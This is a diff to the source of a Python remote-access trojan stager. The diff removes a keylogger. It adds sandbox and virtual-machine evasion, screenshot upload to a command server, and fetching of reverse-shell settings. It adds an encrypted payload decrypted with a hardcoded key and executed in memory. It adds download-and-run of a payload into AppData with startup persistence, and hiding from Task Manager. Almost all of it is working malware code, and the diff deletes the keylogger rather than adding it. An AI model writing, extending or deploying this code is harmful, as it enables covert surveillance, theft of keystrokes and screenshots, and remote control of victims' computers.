@@ -8,34 +8,50 @@ import shutil
 import getpass
 import threading
 from socket import *
-from Cryptodome.Cipher import AES
 from datetime import timezone, datetime, timedelta
 import sys
 from ctypes import *
+from PIL import ImageGrab
+from cryptography.fernet import Fernet
+
+#-  file dropper
+#-  voice record
+#-  remote desktop
+#-  file grabber
 
 OS = platform.uname()[0]
 if OS == "Windows":
     current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
 
 ### NAME OF PAYLOAD AND STAGER FILES YOU CAN NAME ANYTHING YOU WANT, DO NOT INCLUDE EXTENTIONS EX. .EXE OR .BIN
-_STAGER_NAME = "windowsdefender"
+
+_PAYLOAD_NAME = "payload"
+_STAGER_NAME = "stager"
 
 ### IF AUTO START == 1, STAGER WILL CHECK THAT IT IS RUNNING IN AUTOSTART MODE
+
 _AUTOSTART_STAGER = 1
 _AUTOSTART_STAGER_DESKTOP_SHORTCUTS = 0
 
+_DETECT_SANDBOX = 1
+
 ### FULL ADDRESS TO THE WEBSERVER
+
 _WEB_SERVER = "127.0.0.1:3000"
 
 ### REMOVE FROM STARTUP UNTIL TASKMANAGER IS CLOSED WINDOWS ONLY ###
+
 _WIN_TASK_MANANGER_REMOVE_STARTUP = 0
+_HIDE_FROM_TASK_MANAGER = 0
 
 ### DETECT VIRTUAL MACHINE ###
+
 _REMOVE_IF_IN_VM = 1
 
 ### PAYLOAD STAGING OPTIONS ###
 # 1 = EVAL SCRIPT FROM URL IN MEMORY#
 # 2 = DOWNLOAD BINARY TO DISK AND EXECUTE #
+
 _STAGING_OPT = 1
 
 root = 0
@@ -43,10 +59,88 @@ root = 0
 ### If staging == 1, load these variable's , eval payload needs these variables to run properly ###
 ###################################################################################################
 
+def is_running_in_vm_or_sandbox():
+    system = platform.system()
+    if system == "Windows":
+        return detect_vm_or_sandbox_windows()
+    elif system == "Linux":
+        return detect_vm_or_sandbox_linux()
+    else:
+        return False, "Unsupported platform."
+
+def detect_vm_or_sandbox_windows():
+    # Check for known VM-related processes
+    try:
+        process_output = subprocess.check_output("tasklist", shell=True, text=True)
+        vm_indicators = ["VBoxService.exe", "vmtoolsd.exe", "vmsrvc.exe", "vmwaretray.exe"]
+        if any(vm in process_output for vm in vm_indicators):
+            return True, "Detected VM-related processes on Windows."
+    except Exception as e:
+        pass
+
+    # Check registry for VM-related keys
+    try:
+        reg_query = subprocess.check_output(
+            r'reg query "HKLM\HARDWARE\DESCRIPTION\System" /v SystemBiosVersion', 
+            shell=True, 
+            text=True
+        )
+        if any(vm in reg_query.lower() for vm in ["vmware", "virtualbox", "xen"]):
+            return True, "Detected VM-related registry keys."
+    except Exception as e:
+        pass
+
+    return False, "No VM or sandbox indicators detected on Windows."
+
+def detect_vm_or_sandbox_linux():
+    # Check for known VM-related files or devices
+    vm_indicators = [
+        "/sys/class/dmi/id/product_name",
+        "/sys/class/dmi/id/product_version",
+        "/sys/class/dmi/id/sys_vendor",
+    ]
+    for indicator in vm_indicators:
+        if os.path.exists(indicator):
+            try:
+                with open(indicator, 'r') as file:
+                    content = file.read().lower()
+                    if any(vm_word in content for vm_word in ["virtual", "vmware", "qemu", "hyper-v", "xen"]):
+                        return True, "Detected VM-related keywords in system files."
+            except Exception as e:
+                pass
+
+    # Check for virtualization hints in CPU info
+    try:
+        with open("/proc/cpuinfo", "r") as file:
+            cpu_info = file.read().lower()
+            if "hypervisor" in cpu_info or "virtual" in cpu_info:
+                return True, "Detected virtualization in CPU information."
+    except Exception as e:
+        pass
+
+    # Check for virtualization-specific MAC address prefixes
+    mac_prefixes = ["00:05:69", "00:0c:29", "00:50:56", "52:54:00"]
+    try:
+        ifconfig_output = subprocess.check_output("ifconfig", shell=True, text=True)
+        for prefix in mac_prefixes:
+            if prefix in ifconfig_output:
+                return True, "Detected VM-related MAC address prefix."
+    except Exception as e:
+        pass
+
+    return False, "No VM or sandbox indicators detected on Linux."
+
+result, message = is_running_in_vm_or_sandbox()
+if result:
+    exit()
+else:
+    pass
+    
 if _STAGING_OPT == 1:
     import random
     import shlex
     import datetime
+    from datetime import datetime
     import PIL
 
     if OS == "Windows":
@@ -89,35 +183,31 @@ if _STAGING_OPT == 1:
         except Exception as e:
             pass
 
-### KEY LOGGER FUNCTIONS ###
-    def start_keylogger():
-        GetAsyncKeyState = cdll.user32.GetAsyncKeyState
-        special_keys = {0x08: "BS", 0x09: "Tab", 0x0d: "Enter", 0x10: "Shift", 0x11: "Ctrl", 0x12: "Alt", 0x14: "CapsLock", 0x1b: "Esc", 0x20: "Space", 0x2e: "Del"}
-        log = []
-        logstring = ""
-
-        # reset key states
-        for i in range(256):
-            GetAsyncKeyState(i)
-
-        while True:
-            if len(log) >= 25:
-                # UPLOAD LOG HERE #
-                for character in log:
-                    logstring = logstring + character
-                requests.get('http://{0}/keylogger/{1}/{2}/{3}/{4}'.format(_WEB_SERVER, _MY_IP, getpass.getuser(), current_machine_id, logstring))
-                logstring = ""
-                log = []
-            for i in range(256):
-                if GetAsyncKeyState(i) & 1:
-                    if i in special_keys:
-                        pass
-                    elif 0x30 <= i <= 0x5a:
-                        ### characters a-z/0-9 ###
-                        log.append("%c" % i,)
-                    else:
-                        pass   
+    def upload_screenshot(SCREENSHOT):
+        try:
+            
+            with open(SCREENSHOT, "rb") as f:
+                requests.post("http://{0}/upload/screenshot/{1}/{2}/{3}".format(_WEB_SERVER, _MY_IP, username, current_machine_id ), files={"file": f})
+            
+        except Exception as e:
+            pass
     
+    ### Get current clients master reverse shell information ###
+    def get_client_settings():
+        try:
+            proc = requests.get('http://{0}/settings/{1}'.format(_WEB_SERVER, current_machine_id))
+            settings = proc.content.decode('utf8').replace("'", "").replace(",", "").replace("(", "").replace(")", "").replace("[", "").replace("]", "").split()
+            print(settings[1])
+            
+            if settings[0] == 1 :
+                _AUTOSTART_STAGER == 1
+            else:
+                _AUTOSTART_STAGER == 0
+            
+            return proc.content.decode('utf8')
+        except Exception as e:
+            print(e)
+
 ### Reverse shell function ###
     def _RSHELL_OPT_():
         try:
@@ -162,10 +252,15 @@ if _STAGING_OPT == 1:
 
 ### DOWNLOAD LINKS FOR PAYLOAD AND WATCH DOG
 if OS == "Linux":
+    _PAYLOAD_LINK = "http://{0}/downloads/linux/payload".format(_WEB_SERVER)
     _STAGER_LINK = "http://{0}/downloads/linux/stager".format(_WEB_SERVER)
     
 elif OS == "Windows":
+    _PAYLOAD_LINK = "http://{0}/downloads/windows/payload".format(_WEB_SERVER)
     _STAGER_LINK = "http://{0}/downloads/windows/stager".format(_WEB_SERVER)
+
+def start_windows_payload():
+    subprocess.call("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
 
 ### IF OPTION TO AUTOSTART WATCH DOG IS ENABLED, PROCCEED WITH THIS FUNCTION ###
 if _AUTOSTART_STAGER == 1:
@@ -210,10 +305,13 @@ if _AUTOSTART_STAGER == 1:
         except Exception as e:
             pass
 
+### DESCRYPT PAYLOAD AND EXEC IT ###
 def exec_payload_thread():
+    key = b'K4GrR-1um8Mk8_pLId-Kd_ItvPIAoahC_5t7ttQmRSY='
+    cipher = Fernet(b'K4GrR-1um8Mk8_pLId-Kd_ItvPIAoahC_5t7ttQmRSY=')
     r = requests.get("http://{0}/remote".format(_WEB_SERVER))
-    _PAYLOAD_SCRIPT = r.text
-    exec(_PAYLOAD_SCRIPT)
+    decrypted_message = cipher.decrypt(r.text).decode()
+    exec(decrypted_message)
 
 if _STAGING_OPT == 1:
     threading.Thread(target=exec_payload_thread).start()
@@ -223,25 +321,71 @@ while 1:
     RUNNING = 0
     _WIN_TASK_MANAGER_RUNNING = 0
     for PROC in psutil.process_iter():
-        if PROC.name() == "Taskmgr.exe":
-            _WIN_TASK_MANAGER_RUNNING = 1
+        if _STAGING_OPT == 2:
+            if PROC.name() == "payload.exe":
+                RUNNING = 1
+        if _HIDE_FROM_TASK_MANAGER == 1:
+            if PROC.name() == "Taskmgr.exe":
+                _WIN_TASK_MANAGER_RUNNING = 1
+                
+                if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
+                    pass
+                else:
+                    shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
             
-            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
+### IF PAYLOAD NOT RUNNING CHECK IF EXISTS. IF NOT DOWNLOAD AND START ###
+    if _STAGING_OPT == 2:
+        if RUNNING == 0:
+            if _WIN_TASK_MANAGER_RUNNING == 1:
                 pass
             else:
-                shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))    
+                try:
+                    if OS == "Linux":
+                        if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
+                            subprocess.Popen(["chmod", "+x", "{0}".format(_PAYLOAD_NAME)])
+                            subprocess.call("./home/{0}/.config/{0}".format(getpass.getuser(), _PAYLOAD_NAME))
+                        
+                    elif OS == "Windows":
+                        if _WIN_TASK_MANAGER_RUNNING == 1:
+                            pass
+                        
+                        else:
+                            ### IF PAYLOAD NOT IN THE PATH DOWNLOAD FROM LINK ###
+                            if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME)):
+                                threading.Thread(target=start_windows_payload).start()
+                                time.sleep(5)
+                                
+                            else:
+                                requests.get(_PAYLOAD_LINK)
+                                r = requests.get(_PAYLOAD_LINK)
+                                file = open("./{0}.exe".format(_PAYLOAD_NAME), 'wb')
+                                file.write(r.content)
+                                file.close()
+                                shutil.move("./{0}.exe".format(_PAYLOAD_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _PAYLOAD_NAME))
+                            
+                except Exception as e:
+                    pass   
 
 ### CHECK IF TASK MANAGER IS RUNNING CROSSPLATFORM ###
     if _WIN_TASK_MANAGER_RUNNING == 1:
         try:
-                           
-                if OS == "Windows":
+                if OS == "Linux":
+                    if os.path.exists("/home/{0}/.config/{1}".format(getpass.getuser(), _PAYLOAD_NAME)):
+                        pass
+                    
+                elif OS == "Windows":
 
-### IF STAGER IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###
-          
+### IF PAYLOAD IS RUNNING WHILE TASKMANAGER IS RUNNING, KILL IT ###
+                    if _STAGING_OPT == 2:
+                        for PROC in psutil.process_iter():
+                            if PROC.name() == "payload.exe":
+                                os.system("taskkill /f /im payload.exe")
+
+### IF STAGER IS IN STARTUP FOLDER WHILE TASKMANAGER IS OPEN, HIDE IT IN ANOTHER FOLDER ###                    
                     if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                         if os.path.exists("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME)):
                             os.remove("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\{1}.exe".format(getpass.getuser(), _STAGER_NAME))
+
                         shutil.move("C:\\Users\\{0}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{1}.exe".format(getpass.getuser(), _STAGER_NAME), "C:\\Users\\{0}\\AppData\\Roaming\\Microsoft".format(getpass.getuser()))
                         
                         PROC_LIST = []
